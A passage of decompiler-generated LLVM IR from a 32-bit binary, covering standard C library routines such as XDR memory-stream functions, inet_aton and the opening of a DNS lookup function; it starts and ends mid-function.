  %v3_189b8 = load i32, i32* %v2_189b8, align 4
  %v2_189bc = call i32 @llvm.bswap.i32(i32 %v2_1899c)
  %v2_189c0 = inttoptr i32 %v3_189b8 to i32*
  store i32 %v2_189bc, i32* %v2_189c0, align 4
  %v3_189c4 = load i32, i32* %v2_189b8, align 4
  %v1_189c8 = add i32 %v3_189c4, 4
  store i32 %v1_189c8, i32* %v2_189b8, align 4
  br label %dec_label_pc_189d4

dec_label_pc_189d4:                               ; preds = %entry, %dec_label_pc_18998
  %v0_189d4 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18998 ]
  ret i32 %v0_189d4

; uselistorder directives
  uselistorder i32* %v2_189b8, { 1, 0, 2 }
  uselistorder i32 %v3_18984, { 1, 0 }
  uselistorder label %dec_label_pc_189d4, { 1, 0 }
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_189dc = add i32 %arg1, 12
  %v1_189e0 = inttoptr i32 %v1_189dc to i32*
  %v2_189e0 = load i32, i32* %v1_189e0, align 4
  %v3_189e0 = add i32 %arg1, 16
  %v4_189e0 = inttoptr i32 %v3_189e0 to i32*
  %v5_189e0 = load i32, i32* %v4_189e0, align 4
  %v2_189e4 = sub i32 %v2_189e0, %v5_189e0
  ret i32 %v2_189e4
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_189ec = add i32 %arg1, 20
  %v2_189ec = inttoptr i32 %v1_189ec to i32*
  %v3_189ec = load i32, i32* %v2_189ec, align 4
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v1_189f4 = add i32 %arg1, 12
  %v2_189f4 = inttoptr i32 %v1_189f4 to i32*
  %v3_189f4 = load i32, i32* %v2_189f4, align 4
  %v1_189f8 = add i32 %arg1, 16
  %v2_189f8 = inttoptr i32 %v1_189f8 to i32*
  %v3_189f8 = load i32, i32* %v2_189f8, align 4
  %v2_189fc = add i32 %v3_189f4, %v3_189ec
  %v2_18a00 = add i32 %v3_189f8, %arg2
  store i32 %v2_18a00, i32* %r1.global-to-local, align 4
  %not.v7_18a10 = icmp sge i32 %v2_189fc, %v2_18a00
  %. = zext i1 %not.v7_18a10 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  %v7_18a14 = icmp slt i32 %v2_189fc, %v2_18a00
  br i1 %v7_18a14, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_18a08 = sub i32 %v2_189fc, %v2_18a00
  store i32 %v2_18a08, i32* %v2_189ec, align 4
  %v8_18a18 = load i32, i32* %r1.global-to-local, align 4
  %v9_18a18 = load i32, i32* %ip.global-to-local, align 4
  %v10_18a18 = add i32 %v9_18a18, 12
  %v11_18a18 = inttoptr i32 %v10_18a18 to i32*
  store i32 %v8_18a18, i32* %v11_18a18, align 4
  %v1_18a1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_18a1c = phi i32 [ %., %entry ], [ %v1_18a1c.pre, %bb ]
  ret i32 %v1_18a1c

; uselistorder directives
  uselistorder i32 %v2_18a00, { 2, 0, 1, 3 }
  uselistorder i32 %v2_189fc, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1, 4 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v1_18a20 = add i32 %arg1, 20
  %v2_18a20 = inttoptr i32 %v1_18a20 to i32*
  %v3_18a20 = load i32, i32* %v2_18a20, align 4
  %v2_18a24 = sub i32 %v3_18a20, %arg2
  %v3_18a24 = icmp ult i32 %v3_18a20, %arg2
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v3_18a24, label %.thread, label %bb

.thread:                                          ; preds = %entry
  store i32 %v2_18a24, i32* %ip.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %entry
  %v2_18a2c = add i32 %arg1, 12
  %v3_18a2c = inttoptr i32 %v2_18a2c to i32*
  %v4_18a2c = load i32, i32* %v3_18a2c, align 4
  store i32 %v4_18a2c, i32* %r2.global-to-local, align 4
  store i32 %v2_18a24, i32* %ip.global-to-local, align 4
  %v3_18a34 = add i32 %v4_18a2c, %arg2
  store i32 %v3_18a34, i32* %v3_18a2c, align 4
  %v1_18a3c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_18a3c, i32* %v2_18a20, align 4
  %v0_18a40.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb
  %v0_18a40 = phi i32 [ 0, %.thread ], [ %v0_18a40.pre, %bb ]
  ret i32 %v0_18a40

; uselistorder directives
  uselistorder i32 %v2_18a24, { 1, 0 }
  uselistorder i32 %v3_18a20, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_18a4c = add i32 %arg1, 20
  %v2_18a4c = inttoptr i32 %v1_18a4c to i32*
  %v3_18a4c = load i32, i32* %v2_18a4c, align 4
  store i32 %v3_18a4c, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %tmp4 = icmp ult i32 %v3_18a4c, 4
  br i1 %tmp4, label %dec_label_pc_18aa0, label %dec_label_pc_18a64

dec_label_pc_18a64:                               ; preds = %entry
  %v1_18a54 = add i32 %v3_18a4c, -4
  %v1_18a64 = add i32 %arg1, 12
  %v2_18a64 = inttoptr i32 %v1_18a64 to i32*
  %v3_18a64 = load i32, i32* %v2_18a64, align 4
  store i32 %v3_18a64, i32* %r3.global-to-local, align 4
  store i32 %v1_18a54, i32* %v2_18a4c, align 4
  %v0_18a6c = load i32, i32* %r3.global-to-local, align 4
  %v1_18a6c = inttoptr i32 %v0_18a6c to i32*
  %v2_18a6c = load i32, i32* %v1_18a6c, align 4
  %v2_18a88 = call i32 @llvm.bswap.i32(i32 %v2_18a6c)
  store i32 %v2_18a88, i32* %r3.global-to-local, align 4
  %v1_18a8c = load i32, i32* %ip.global-to-local, align 4
  %v2_18a8c = inttoptr i32 %v1_18a8c to i32*
  store i32 %v2_18a88, i32* %v2_18a8c, align 4
  %v3_18a90 = load i32, i32* %v2_18a64, align 4
  %v1_18a94 = add i32 %v3_18a90, 4
  store i32 %v1_18a94, i32* %r3.global-to-local, align 4
  store i32 %v1_18a94, i32* %v2_18a64, align 4
  br label %dec_label_pc_18aa0

dec_label_pc_18aa0:                               ; preds = %entry, %dec_label_pc_18a64
  %v0_18aa0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18a64 ]
  ret i32 %v0_18aa0

; uselistorder directives
  uselistorder i32 %v2_18a88, { 1, 0 }
  uselistorder i32* %v2_18a64, { 1, 0, 2 }
  uselistorder i32 %v3_18a4c, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_18aa0, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_18aa8 = add i32 %arg1, 20
  %v2_18aa8 = inttoptr i32 %v1_18aa8 to i32*
  %v3_18aa8 = load i32, i32* %v2_18aa8, align 4
  %tmp = icmp ult i32 %v3_18aa8, 4
  br i1 %tmp, label %dec_label_pc_18af8, label %dec_label_pc_18abc

dec_label_pc_18abc:                               ; preds = %entry
  %v1_18ab0 = add i32 %v3_18aa8, -4
  store i32 %v1_18ab0, i32* %v2_18aa8, align 4
  %v2_18ac0 = load i32, i32* %arg2, align 4
  %v1_18adc = add i32 %arg1, 12
  %v2_18adc = inttoptr i32 %v1_18adc to i32*
  %v3_18adc = load i32, i32* %v2_18adc, align 4
  %v2_18ae0 = call i32 @llvm.bswap.i32(i32 %v2_18ac0)
  %v2_18ae4 = inttoptr i32 %v3_18adc to i32*
  store i32 %v2_18ae0, i32* %v2_18ae4, align 4
  %v3_18ae8 = load i32, i32* %v2_18adc, align 4
  %v1_18aec = add i32 %v3_18ae8, 4
  store i32 %v1_18aec, i32* %v2_18adc, align 4
  br label %dec_label_pc_18af8

dec_label_pc_18af8:                               ; preds = %entry, %dec_label_pc_18abc
  %v0_18af8 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18abc ]
  ret i32 %v0_18af8

; uselistorder directives
  uselistorder i32* %v2_18adc, { 1, 0, 2 }
  uselistorder i32 %v3_18aa8, { 1, 0 }
  uselistorder label %dec_label_pc_18af8, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  %v1_18b04 = add i32 %arg1, 20
  %v2_18b04 = inttoptr i32 %v1_18b04 to i32*
  %v3_18b04 = load i32, i32* %v2_18b04, align 4
  %v3_18b08 = icmp ult i32 %v3_18b04, %arg2
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v3_18b08, label %bb, label %bb4

bb:                                               ; preds = %entry
  ret i32 0

bb4:                                              ; preds = %entry
  %v2_18b08 = sub i32 %v3_18b04, %arg2
  store i32 %v2_18b08, i32* %v2_18b04, align 4
  %v0_18b24 = load i32, i32* @r4, align 4
  %v1_18b24 = add i32 %v0_18b24, 12
  %v2_18b24 = inttoptr i32 %v1_18b24 to i32*
  %v3_18b24 = load i32, i32* %v2_18b24, align 4
  store i32 %v3_18b24, i32* @r0, align 4
  %v0_18b28 = call i32 @memcpy()
  %v0_18b2c = load i32, i32* @r4, align 4
  %v1_18b2c = add i32 %v0_18b2c, 12
  %v2_18b2c = inttoptr i32 %v1_18b2c to i32*
  %v3_18b2c = load i32, i32* %v2_18b2c, align 4
  %v1_18b34 = load i32, i32* @r5, align 4
  %v2_18b34 = add i32 %v1_18b34, %v3_18b2c
  store i32 %v2_18b34, i32* %v2_18b2c, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r2, align 4
  %v1_18b44 = add i32 %arg1, 20
  %v2_18b44 = inttoptr i32 %v1_18b44 to i32*
  %v3_18b44 = load i32, i32* %v2_18b44, align 4
  %v3_18b48 = icmp ult i32 %v3_18b44, %arg3
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r0, align 4
  br i1 %v3_18b48, label %dec_label_pc_18b80, label %dec_label_pc_18b64

dec_label_pc_18b64:                               ; preds = %entry
  %v2_18b48 = sub i32 %v3_18b44, %arg3
  store i32 %v2_18b48, i32* %v2_18b44, align 4
  %v0_18b68 = load i32, i32* @r4, align 4
  %v1_18b68 = add i32 %v0_18b68, 12
  %v2_18b68 = inttoptr i32 %v1_18b68 to i32*
  %v3_18b68 = load i32, i32* %v2_18b68, align 4
  store i32 %v3_18b68, i32* @r1, align 4
  %v0_18b6c = call i32 @memcpy()
  %v0_18b70 = load i32, i32* @r4, align 4
  %v1_18b70 = add i32 %v0_18b70, 12
  %v2_18b70 = inttoptr i32 %v1_18b70 to i32*
  %v3_18b70 = load i32, i32* %v2_18b70, align 4
  %v1_18b74 = load i32, i32* @r5, align 4
  %v2_18b74 = add i32 %v1_18b74, %v3_18b70
  store i32 %v2_18b74, i32* %v2_18b70, align 4
  br label %dec_label_pc_18b80

dec_label_pc_18b80:                               ; preds = %entry, %dec_label_pc_18b64
  %v0_18b80 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_18b64 ]
  ret i32 %v0_18b80

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_18b80, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_18b88 = load i32, i32* %r0.global-to-local, align 4
  %v2_18b88 = icmp eq i32 %v0_18b88, 0
  %v3_18b8c = load i32, i32* @r4, align 4
  store i32 %v3_18b8c, i32* %stack_var_-20, align 4
  br i1 %v2_18b88, label %dec_label_pc_18c68, label %dec_label_pc_18ba4.lr.ph

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18ba4.lr.ph, %dec_label_pc_18c28
  %v1_18c28 = phi i32 [ 0, %dec_label_pc_18ba4.lr.ph ], [ %v5_18c28, %dec_label_pc_18c28 ]
  %v0_18c2c = phi i32 [ 1, %dec_label_pc_18ba4.lr.ph ], [ %v1_18c2c, %dec_label_pc_18c28 ]
  %v0_18bac = phi i32 [ %v0_18b88, %dec_label_pc_18ba4.lr.ph ], [ %v0_18bac25, %dec_label_pc_18c28 ]
  store i32 %v2_18ba8.pre, i32* @lr, align 4
  %v1_18bac = inttoptr i32 %v0_18bac to i8*
  %v2_18bac = load i8, i8* %v1_18bac, align 1
  %v3_18bac = zext i8 %v2_18bac to i32
  %v3_18bb0 = mul nuw nsw i32 %v3_18bac, 2
  %v4_18bb0 = add i32 %v3_18bb0, %v2_18ba8.pre
  %v5_18bb0 = inttoptr i32 %v4_18bb0 to i8*
  %v6_18bb0 = load i8, i8* %v5_18bb0, align 1
  %v1_18bb4 = and i8 %v6_18bb0, 8
  %v2_18bb4 = icmp eq i8 %v1_18bb4, 0
  br i1 %v2_18bb4, label %dec_label_pc_18c68, label %dec_label_pc_18bbc

dec_label_pc_18bbc:                               ; preds = %dec_label_pc_18ba4
  br label %dec_label_pc_18bdc

dec_label_pc_18bc4:                               ; preds = %dec_label_pc_18bdc
  %v3_18bc8 = mul i32 %v0_18c28, 10
  %v4_18bc8 = add i32 %v3_18bdc, %v3_18bc8
  %v1_18bcc = add i32 %v4_18bc8, -48
  %v8_18bd4 = icmp sgt i32 %v1_18bcc, 255
  br i1 %v8_18bd4, label %dec_label_pc_18c68, label %dec_label_pc_18bd8

dec_label_pc_18bd8:                               ; preds = %dec_label_pc_18bc4
  %v1_18bd8 = add i32 %v0_18c18, 1
  store i32 %v1_18bd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18bdc

dec_label_pc_18bdc:                               ; preds = %dec_label_pc_18bbc, %dec_label_pc_18bd8
  %v0_18c28 = phi i32 [ 0, %dec_label_pc_18bbc ], [ %v1_18bcc, %dec_label_pc_18bd8 ]
  %v0_18c18 = phi i32 [ %v0_18bac, %dec_label_pc_18bbc ], [ %v1_18bd8, %dec_label_pc_18bd8 ]
  %v1_18bdc = inttoptr i32 %v0_18c18 to i8*
  %v2_18bdc = load i8, i8* %v1_18bdc, align 1
  %v3_18bdc = zext i8 %v2_18bdc to i32
  %v2_18be0 = mul nuw nsw i32 %v3_18bdc, 2
  %v2_18be4 = add i32 %v2_18be0, %v2_18ba8.pre
  %v3_18be8 = inttoptr i32 %v2_18be4 to i8*
  %v4_18be8 = load i8, i8* %v3_18be8, align 1
  %v6_18be8 = zext i8 %v4_18be8 to i32
  %v1_18bf4 = and i32 %v6_18be8, 8
  %v2_18bf4 = icmp eq i32 %v1_18bf4, 0
  br i1 %v2_18bf4, label %dec_label_pc_18bfc, label %dec_label_pc_18bc4

dec_label_pc_18bfc:                               ; preds = %dec_label_pc_18bdc
  %v8_18c00 = icmp sgt i32 %v0_18c2c, 3
  br i1 %v8_18c00, label %dec_label_pc_18c14, label %dec_label_pc_18c04

dec_label_pc_18c04:                               ; preds = %dec_label_pc_18bfc
  %v7_18c04 = icmp eq i8 %v2_18bdc, 46
  br i1 %v7_18c04, label %dec_label_pc_18c0c, label %dec_label_pc_18c68

dec_label_pc_18c0c:                               ; preds = %dec_label_pc_18c04
  %v1_18c0c = add i32 %v0_18c18, 1
  store i32 %v1_18c0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c28

dec_label_pc_18c14:                               ; preds = %dec_label_pc_18bfc
  %v2_18c14 = icmp eq i8 %v2_18bdc, 0
  %v1_18c18 = add i32 %v0_18c18, 1
  store i32 %v1_18c18, i32* %r0.global-to-local, align 4
  br i1 %v2_18c14, label %dec_label_pc_18c28, label %dec_label_pc_18c20

dec_label_pc_18c20:                               ; preds = %dec_label_pc_18c14
  %v1_18c20 = and i32 %v6_18be8, 32
  %v2_18c20 = icmp eq i32 %v1_18c20, 0
  br i1 %v2_18c20, label %dec_label_pc_18c68, label %dec_label_pc_18c28

dec_label_pc_18c28:                               ; preds = %dec_label_pc_18c20, %dec_label_pc_18c14, %dec_label_pc_18c0c
  %v0_18bac25 = phi i32 [ %v1_18c18, %dec_label_pc_18c20 ], [ %v1_18c18, %dec_label_pc_18c14 ], [ %v1_18c0c, %dec_label_pc_18c0c ]
  %v4_18c28 = mul i32 %v1_18c28, 256
  %v5_18c28 = or i32 %v0_18c28, %v4_18c28
  %v1_18c2c = add nuw nsw i32 %v0_18c2c, 1
  %v7_18c34 = icmp slt i32 %v1_18c2c, 5
  br i1 %v7_18c34, label %dec_label_pc_18ba4, label %dec_label_pc_18c38

dec_label_pc_18ba4.lr.ph:                         ; preds = %entry
  %v2_18ba8.pre = load i32, i32* @global_var_2abb8, align 4
  br label %dec_label_pc_18ba4

dec_label_pc_18c38:                               ; preds = %dec_label_pc_18c28
  %v2_18c38 = icmp eq i32 %arg2, 0
  br i1 %v2_18c38, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_18c38
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_18c38
  %v3_18c54 = call i32 @llvm.bswap.i32(i32 %v5_18c28)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18c60 = inttoptr i32 %arg2 to i32*
  store i32 %v3_18c54, i32* %v3_18c60, align 4
  %v2_18c64.pre = load i32, i32* %stack_var_-20, align 4
  %v17_18c64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_18c64 = phi i32 [ 1, %bb ], [ %v17_18c64.pre, %bb41 ]
  %v2_18c64 = phi i32 [ %v3_18b8c, %bb ], [ %v2_18c64.pre, %bb41 ]
  store i32 %v2_18c64, i32* @r4, align 4
  ret i32 %v17_18c64

dec_label_pc_18c68:                               ; preds = %dec_label_pc_18c04, %dec_label_pc_18c20, %dec_label_pc_18ba4, %dec_label_pc_18bc4, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_18b8c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_18ba8.pre, { 2, 1, 0 }
  uselistorder i32 %v1_18c2c, { 1, 0 }
  uselistorder i32 %v0_18c18, { 0, 1, 3, 2 }
  uselistorder i32 %v3_18b8c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_18c68, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18bdc, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_18c74 = load i32, i32* @r4, align 4
  %v6_18c74 = load i32, i32* @r5, align 4
  %v9_18c74 = load i32, i32* @r6, align 4
  %v12_18c74 = load i32, i32* @r7, align 4
  %v15_18c74 = load i32, i32* @r8, align 4
  %v18_18c74 = load i32, i32* @sb, align 4
  %v21_18c74 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_18c94 = call i32 @malloc(i32 512)
  store i32 %v1_18c94, i32* @r7, align 4
  %v1_18ca0 = call i32 @malloc(i32 1025)
  %v2_18ca4 = icmp eq i32 %v1_18ca0, 0
  br i1 %v2_18ca4, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_18ca8 = load i32, i32* @r7, align 4
  %v3_18ca8 = icmp eq i32 %v1_18ca8, 0
  store i32 %v1_18ca0, i32* %stack_var_-236, align 4
  br i1 %v3_18ca8, label %bb195, label %dec_label_pc_18cbc

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1939c

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1939c

dec_label_pc_18cbc:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_18cc0 = icmp eq i32 %arg3, 0
  br i1 %v2_18cc0, label %dec_label_pc_1939c, label %dec_label_pc_18cc8

dec_label_pc_18cc8:                               ; preds = %dec_label_pc_18cbc
  %v2_18ccc = load i8, i8* %arg1, align 1
  %v2_18cd0 = icmp eq i8 %v2_18ccc, 0
  br i1 %v2_18cd0, label %dec_label_pc_1939c, label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %dec_label_pc_18cc8
  %v3_18cdc = call i32 @strlen(i8* nonnull %arg1)
  %v2_18ce4 = add i32 %v3_18cdc, %tmp
  %v1_18ce8 = add i32 %v2_18ce4, -1
  %v2_18ce8 = inttoptr i32 %v1_18ce8 to i8*
  %v3_18ce8 = load i8, i8* %v2_18ce8, align 1
  %v2_18cec = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18cec, i32* @r4, align 4
  %v7_18cf0 = icmp eq i8 %v3_18ce8, 46
  %. = zext i1 %v7_18cf0 to i32
  store i32 ptrtoint (i32* @global_var_2f4fc.918 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  %v1_18d14 = call i32 @__pthread_cleanup_push_defer()
  %v2_18d24 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2f4fc.918 to i32))
  %v2_18d30 = load i32, i32* @global_var_2f514.923, align 4
  %v2_18d34 = srem i32 %v2_18d30, %arg3
  %v3_18d3c = load i8, i8* @global_var_2abdd.926, align 1
  %v4_18d3c = zext i8 %v3_18d3c to i32
  %v2_18d40 = load i8, i8* bitcast (i8** @global_var_2abdc.925 to i8*), align 4
  %v3_18d40 = zext i8 %v2_18d40 to i32
  store i32 1, i32* @r1, align 4
  %v4_18d48 = mul nuw nsw i32 %v4_18d3c, 256
  %v5_18d48 = or i32 %v3_18d40, %v4_18d48
  store i32 %v5_18d48, i32* @sb, align 4
  store i32 %v2_18d34, i32* @sl, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  store i32 101728, i32* @lr, align 4
  %v1_18d5c = call i32 @__pthread_cleanup_pop_restore()
  %v0_18d68 = load i32, i32* @r5, align 4
  %v2_18d88 = ptrtoint i8* %stack_var_-188 to i32
  %v6_18dcc = bitcast i8* %stack_var_-188 to i32*
  %v2_18eac = ptrtoint i32* %stack_var_-92 to i32
  %v2_18f3c = ptrtoint i8* %stack_var_-100 to i32
  %v3_18fa8 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_192f4 = icmp eq i1 %v7_18cf0, false
  %v7_18ffc = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_190e0 = ptrtoint i32* %stack_var_-140 to i32
  %v9_191d8 = icmp eq i32 %tmp147, %arg2
  %v7_1916c = icmp eq i32 %arg2, 1
  %v2_19114 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_18d68, 3
  br i1 %tmp292, label %dec_label_pc_18d70.lr.ph.preheader.lr.ph, label %dec_label_pc_193a8

dec_label_pc_18d70.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_18cd8
  %v2_19080 = icmp eq i32 %tmp156, 0
  %v8_19170 = icmp eq i32 %arg2, 28
  br label %dec_label_pc_18d70.lr.ph.preheader

dec_label_pc_18d70:                               ; preds = %dec_label_pc_18d70.lr.ph, %dec_label_pc_1938c.backedge
  %v1_18d78 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_18d70.lr.ph ], [ %v0_18f20, %dec_label_pc_1938c.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_18d70.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_1938c.backedge ]
  %v7_18d74 = icmp eq i32 %v1_18d78, -1
  br i1 %v7_18d74, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_18d70
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_18d70, %bb199
  %v1_18d7c = xor i1 %v7_18d74, true
  call void @__pseudo_cond_branch(i1 %v1_18d7c, i32 ptrtoint (i32* @global_var_10018.859 to i32))
  store i32 0, i32* @r1, align 4
  store i32 512, i32* @r2, align 4
  store i32 %v2_18d88, i32* @r4, align 4
  %v0_18d8c = load i32, i32* @r7, align 4
  store i32 %v0_18d8c, i32* @r0, align 4
  %v0_18d90 = call i32 @__GI_memset()
  store i32 0, i32* @r1, align 4
  store i32 48, i32* @r2, align 4
  store i32 %v2_18d88, i32* @r0, align 4
  %v0_18da0 = call i32 @__GI_memset()
  %v0_18da4 = load i32, i32* @sb, align 4
  %v1_18da4 = add i32 %v0_18da4, 1
  %v3_18dac = urem i32 %v1_18da4, 65536
  store i32 %v3_18dac, i32* @sb, align 4
  %v0_18db8 = load i32, i32* @r7, align 4
  %v5_18dc4 = trunc i32 %v1_18da4 to i8
  store i8 %v5_18dc4, i8* %stack_var_-188, align 1
  %v7_18dcc = call i32 @__encode_header(i32* %v6_18dcc, i32 %v0_18db8, i32 512, i32 1, i32 %v1_18da4)
  store i32 %v7_18dcc, i32* @r5, align 4
  %v1_18dd0 = icmp slt i32 %v7_18dcc, 0
  br i1 %v1_18dd0, label %dec_label_pc_193a8, label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_18de0 = load i32, i32* %stack_var_-236, align 4
  %v4_18de4 = call i32 @strncpy(i32 %v2_18de0, i32 %tmp, i32 1025)
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 %v2_18cec, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* @r2, align 4
  %v1_18dfc = call i32 @__pthread_cleanup_push_defer()
  %v2_18e0c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2abe0.674 to i32))
  %v1_18e1c = load i32, i32* @sl, align 4
  %v4_18e1c = mul i32 %v1_18e1c, 4
  %v5_18e1c = add i32 %v4_18e1c, %arg4
  %v6_18e1c = inttoptr i32 %v5_18e1c to i32*
  %v7_18e1c = load i32, i32* %v6_18e1c, align 4
  store i32 %v7_18e1c, i32* @r6, align 4
  br i1 %v1_18e18, label %dec_label_pc_18e60, label %dec_label_pc_18e24

dec_label_pc_18e24:                               ; preds = %dec_label_pc_18dd8
  %v2_18e2c = load i32, i32* @global_var_2f654.930, align 4
  %v6_18e34 = icmp slt i32 %v6_19350, %v2_18e2c
  br i1 %v6_18e34, label %dec_label_pc_18e38, label %dec_label_pc_18e60

dec_label_pc_18e38:                               ; preds = %dec_label_pc_18e24
  store i32 ptrtoint (i32* @global_var_1dda8.932 to i32), i32* @r1, align 4
  %v2_18e40 = load i32, i32* %stack_var_-236, align 4
  %v4_18e44 = inttoptr i32 %v2_18e40 to i8*
  %v5_18e44 = call i32 @__GI_strncat(i8* %v4_18e44, i32 ptrtoint (i32* @global_var_1dda8.932 to i32), i32 1025, i32 %v2_18e2c)
  %v7_18e54 = load i32, i32* %v6_18e54, align 4
  store i32 %v7_18e54, i32* @r1, align 4
  %v4_18e5c = inttoptr i32 %v2_18e40 to i8*
  %v5_18e5c = call i32 @__GI_strncat(i8* %v4_18e5c, i32 %v7_18e54, i32 1025, i32 ptrtoint (i32* @global_var_2f634.934 to i32))
  br label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e24, %dec_label_pc_18dd8, %dec_label_pc_18e38
  store i32 %v2_18cec, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 102004, i32* @lr, align 4
  %v1_18e70 = call i32 @__pthread_cleanup_pop_restore()
  %v2_18e7c = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18e7c, i32* %stack_var_-56, align 4
